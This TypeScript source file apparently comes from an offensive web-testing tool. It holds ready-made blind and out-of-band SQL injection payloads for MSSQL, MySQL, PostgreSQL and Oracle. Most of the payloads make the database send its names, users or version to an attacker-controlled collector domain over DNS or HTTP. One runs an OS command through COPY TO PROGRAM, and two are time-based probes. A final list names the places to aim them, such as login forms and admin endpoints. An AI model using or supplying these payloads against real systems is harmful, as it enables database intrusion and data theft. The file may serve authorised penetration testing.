export interface BlindSqliPayload {
  id: string;
  label: string;
  build: (collector: string) => string;
}

// Out-of-band SQLi: instead of reading a response difference, these make the
// database itself resolve a DNS name (or make an HTTP request) at your
// collector domain, confirming injection even when the response gives no
// visible signal at all.
export const BLIND_SQLI_PAYLOADS: BlindSqliPayload[] = [
  {
    id: 'mssql-xp-dirtree',
    label: 'MSSQL - xp_dirtree DNS exfil',
    build: (c) => `';EXEC master..xp_dirtree '\\\\'+(SELECT TOP 1 name FROM sys.databases)+'.${c}\\a';--`,
  },
  {
    id: 'mssql-xp-fileexist',
    label: 'MSSQL - xp_fileexist DNS exfil',
    build: (c) => `';DECLARE @x INT;EXEC master..xp_fileexist '\\\\'+(SELECT SYSTEM_USER)+'.${c}\\a',@x OUTPUT;--`,
  },
  {
    id: 'mysql-load-file-unc',
    label: 'MySQL (Windows host) - LOAD_FILE UNC DNS exfil',
    build: (c) => `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.${c}\\\\a'))-- -`,
  },
  {
    id: 'postgres-copy-program',
    label: 'PostgreSQL - COPY TO PROGRAM DNS exfil',
    build: (c) => `';COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.${c}';--`,
  },
  {
    id: 'oracle-utl-inaddr',
    label: 'Oracle - UTL_INADDR DNS exfil',
    build: (c) => `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.${c}') FROM dual--`,
  },
  {
    id: 'oracle-xxe-dns',
    label: 'Oracle - XXE-via-XMLType DNS exfil',
    build: (c) =>
      `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % re SYSTEM "http://'||(SELECT user FROM dual)||'.${c}/">%re;]>'),'/l') FROM dual--`,
  },
  {
    id: 'mysql-time-based',
    label: 'MySQL - time-based confirmation (no collector needed)',
    build: () => `' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -`,
  },
  {
    id: 'mssql-time-based',
    label: 'MSSQL - time-based confirmation (no collector needed)',
    build: () => `';IF (1=1) WAITFOR DELAY '0:0:5';--`,
  },
];

export const BLIND_SQLI_LANDING_SPOTS = [
  'Search boxes and filter/sort parameters',
  'Login forms (username/password fields)',
  'Cookie and header values that reach a query (via HeaderInject)',
  'Hidden form fields and API JSON bodies',
  'Report/export features that build a query from stored filters',
  'Admin-only endpoints that skip the input validation used on public ones',
];
